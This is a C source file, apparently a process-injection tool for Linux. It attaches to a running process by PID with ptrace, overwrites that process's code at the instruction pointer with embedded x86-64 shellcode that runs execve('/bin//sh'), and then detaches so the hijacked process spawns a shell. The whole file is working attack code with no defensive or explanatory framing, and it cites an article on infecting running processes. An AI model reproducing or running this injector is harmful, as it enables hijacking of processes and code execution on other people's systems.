#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/types.h>
#include <sys/user.h>
#include <wait.h>

int main(int argc, char *argv[]) {
  pid_t pid;
  pid = (pid_t)atoi(argv[1]);

  unsigned char sc[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48"
                       "\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
                       "\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

  size_t sclen = sizeof(sc) - 1;

  // while (sc[sclen] != '\0') {
  //   sclen++;
  // }
  // sclen++;

  printf("Attaching to PID: %d\n", pid);
  if ((ptrace(PTRACE_ATTACH, pid, NULL, NULL)) != 0) {
    printf("Error: Problems Attaching\n");
    return 1;
  }
  int waitxxx;
  if (waitpid(pid, &waitxxx, WUNTRACED) != pid) {
    printf("Error: Waiting proc %d\n", pid);
    return 1;
  }

  struct user_regs_struct regs;
  if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) != 0) {
    printf("Error: Problems Saving Regs\n");
    return 0;
  }

  uint32_t *s = (uint32_t *)sc;
  uint32_t *d = (uint32_t *)regs.rip;
  printf("Start injecting shellcode at %p\n", d);
  for (int i = 0; i < sclen; i += 4, s++, d++) {
    uint32_t *xs = s;
    unsigned char xp = *s;
    printf("Writting from %p - %x to %p\n", xs, *s, d);
    if (ptrace(PTRACE_POKETEXT, pid, d, *s) != 0) {
      printf("Error: Problems writting intruction\n");
      printf("+ From %p - %x\n", xs, xp);
      return 1;
    }
  }
  printf("%d Bytes written\n", (int)sclen);

  regs.rip += 2; // PTRACE_DEATCH subtracts 2 bytes to the Instruction Pointer
  // https://0x00sec.org/t/linux-infecting-running-processes/1097

  printf("Continue from %p\n", (void *)regs.rip);
  if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) != 0) {
    printf("Error: Problems setting regs.\n");
    return 1;
  }

  printf("Deataching from PID: %d\n", pid);
  if (ptrace(PTRACE_DETACH, pid, NULL, NULL) != 0) {
    printf("Error: Problems deataching regs.\n");
    return 1;
  }
  return 0;
}
